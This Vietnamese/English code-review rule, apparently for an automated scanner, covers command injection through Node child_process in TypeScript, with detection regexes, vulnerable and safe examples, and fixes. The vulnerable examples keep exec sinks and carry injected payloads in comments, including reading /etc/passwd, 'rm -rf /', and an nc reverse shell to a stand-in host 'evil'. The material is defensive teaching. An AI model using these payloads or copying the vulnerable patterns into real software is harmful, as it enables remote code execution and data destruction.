---
id: COMMAND-INJECTION
severity_max: CRITICAL
applies_to: typescript
---

# Command Injection — TypeScript/JavaScript Specialization

> Override cho rule chung `rules/generic/21-command-injection.md`. Áp dụng khi `primary_language: typescript`.

## Intent (TypeScript-specific)

Node `child_process` có 2 family:
- **`exec` / `execSync` / `spawn('sh', ['-c', ...])`** — chạy qua shell, parse metacharacter (`;`, `|`, `$()`, `` ` ``, `&&`). Nếu user input đi vào string command → RCE trivial.
- **`execFile` / `spawn(cmd, [args])`** — KHÔNG qua shell, mỗi arg riêng. An toàn hơn rất nhiều.

Vibe code thường viết `exec(\`ping ${host}\`)` vì template literal "đẹp" — đây là CRITICAL. Ngoài ra `shelljs` package (`shell.exec`), build tool (gulp, custom script) chạy command từ config user-controllable cũng vào diện này.

## Khi nào CRITICAL

- `child_process.exec(userInput)` / `execSync(userInput)` với input từ request
- `child_process.spawn('sh', ['-c', userInput])` hoặc `'bash'`, `'/bin/sh'`
- `exec(\`cmd ${userInput}\`)` — template literal
- `exec('cmd ' + userInput)` — string concat
- `shelljs.exec(userInput)`
- `eval(userInput)` (cross-ref deserialization) — không phải command nhưng tương đương RCE
- Function args truyền vào `execFile(file, [arg, ...])` nhưng `file` là user-controlled → vẫn nguy hiểm (chạy binary tùy ý)

## Khi nào HIGH (giảm cấp)

- Dùng `execFile(cmd, [args])` với `cmd` cố định, args là user input — args không qua shell nên metacharacter vô hại với hầu hết binary, nhưng vẫn có thể inject flag (`-` prefix attack). Vd `git clone $USER_URL` → user truyền `--upload-pack=... ` evil
- Đã có whitelist regex chặt (vd `/^[a-z0-9.-]+$/.test(host)`) trước concat
- Endpoint chỉ admin sau auth

## Khi nào MEDIUM/LOW

- Cmd hoàn toàn từ constant / config, không chứa user input
- Sandbox container (vd: chạy trong gVisor, Firecracker) — risk giảm nhưng không xóa

## Cách reasoning

1. **Grep** sink: `child_process`, `exec\(`, `execSync`, `spawn`, `execFile`, `fork`, `shelljs`
2. **Read** call: argument là string (qua shell) hay array (no shell)?
3. **Trace** input source: L1 (`req.body`, `req.query`), L2 (DB), L3 (env)
4. **Verify**:
   - Có `execFile(cmd, [arg1, arg2])` thay vì `exec`?
   - Có whitelist input trước khi nhét?
   - `shell: false` (mặc định) trong spawn options?

## Search patterns

```
# child_process family
require\(["']child_process["']\)
import\s+\{[^}]*\}\s+from\s+["']child_process["']
import\s+child_process\s+from

# Sink — exec qua shell (CRITICAL nếu input L1)
\.exec\s*\(\s*[`"']
\.execSync\s*\(\s*[`"']
\.exec\s*\(\s*[a-zA-Z_$][a-zA-Z0-9_$]*\s*[\+,]
exec\s*\(\s*`[^`]*\$\{

# spawn với shell
spawn\s*\(\s*["'](sh|bash|/bin/sh|/bin/bash|cmd|cmd\.exe)["']
spawn\s*\([^,]+,\s*[^,]+,\s*\{[^}]*shell\s*:\s*true

# Template literal trong command
(exec|execSync|spawn)\s*\(\s*`[^`]*\$\{

# shelljs
require\(["']shelljs["']\)
shell\.exec\s*\(

# Specific path
fs\.\w+\s*\([^)]*\.\.[^)]*\)    # not command but related

# Safer pattern (negative check)
execFile\s*\(           # if seen with constant cmd + array args, generally OK
```

## Examples

### CRITICAL — flag

```typescript
// Express + exec template literal — Juice Shop classic
import { exec } from 'child_process';

app.get('/ping', (req, res) => {
  const host = req.query.host as string;  // L1
  exec(`ping -c 1 ${host}`, (err, stdout) => {
    res.json({ output: stdout });
  });
});
// Exploit: ?host=1.1.1.1;cat /etc/passwd
```

```typescript
// execSync với input
app.post('/git-clone', (req, res) => {
  const repo = req.body.repo;
  execSync(`git clone ${repo} /tmp/repos/${nanoid()}`);
  // Exploit: repo = "x.git; rm -rf /"
});
```

```typescript
// spawn sh -c
spawn('sh', ['-c', `convert ${userFile} /tmp/out.png`]);
// File extension trick: filename = "a.png; nc evil 4444 -e /bin/sh"
```

```typescript
// shelljs.exec
import shell from 'shelljs';
app.post('/process', (req, res) => {
  shell.exec(`./run.sh ${req.body.arg}`);
});
```

```typescript
// NestJS — exec trong service
@Injectable()
export class ImageService {
  resize(filename: string) {
    return exec(`convert ${filename} -resize 100x100 out.jpg`);  // filename L1
  }
}
```

### NOT critical — safe

```typescript
// execFile — args riêng, không qua shell
import { execFile } from 'child_process';

app.get('/ping', (req, res) => {
  const host = req.query.host as string;
  if (!/^[a-z0-9.-]+$/.test(host)) return res.status(400).end();  // whitelist
  execFile('ping', ['-c', '1', host], (err, stdout) => {
    res.json({ output: stdout });
  });
});
```

```typescript
// spawn với array args, shell: false (default)
import { spawn } from 'child_process';
const p = spawn('convert', [inputFile, '-resize', '100x100', outputFile]);
// inputFile vẫn cần validate (path traversal, flag injection)
```

```typescript
// Promise wrapper an toàn
import { execFile } from 'child_process';
import { promisify } from 'util';
const execFileP = promisify(execFile);

async function getDiskUsage(path: string) {
  if (path.startsWith('/') === false) throw new Error('Invalid path');
  const { stdout } = await execFileP('du', ['-sh', path]);
  return stdout;
}
```

## Fix recommendation

1. **Quy tắc vàng**: dùng `execFile` hoặc `spawn` với array args, KHÔNG dùng `exec`/`execSync` khi có user input:
   ```typescript
   // BAD
   exec(`tar -xzf ${file}`);
   // GOOD
   execFile('tar', ['-xzf', file]);
   ```

2. **Flag injection defense**: nếu arg user-controlled có thể bắt đầu bằng `-`, validate hoặc dùng `--` separator:
   ```typescript
   execFile('git', ['clone', '--', userRepo, '/tmp/dest']);
   ```

3. **Whitelist**:
   ```typescript
   const ALLOWED_HOSTS = /^[a-z0-9.-]+$/;
   if (!ALLOWED_HOSTS.test(host)) throw new Error('Invalid host');
   ```

4. **Sử dụng library Node thay vì shell out**:
   - File operations: `fs/promises`
   - Archive: `tar`, `unzipper`, `archiver` (npm)
   - Image: `sharp` (libvips) thay vì shell out `convert`
   - HTTP: `fetch`/`axios` thay vì `curl`
   - Git: `simple-git`, `isomorphic-git`

5. **Timeout + max buffer**:
   ```typescript
   execFile('cmd', args, { timeout: 5000, maxBuffer: 1024 * 1024 });
   ```

6. **Drop privileges**: chạy worker process với UID thấp / container. Defense in depth.

7. **Bỏ shelljs** trong production code (acceptable cho build script local).

## Cross-references

- TS `08-insecure-deserialization`: deserialization RCE chain với `child_process.exec`
- TS `09-ssrf`: SSRF + RCE qua internal service
- Generic `10-path-traversal`: file path user input + exec = combined exploit
- TS `17-verbose-error-debug-mode`: exec error chứa command đầy đủ leak ra response
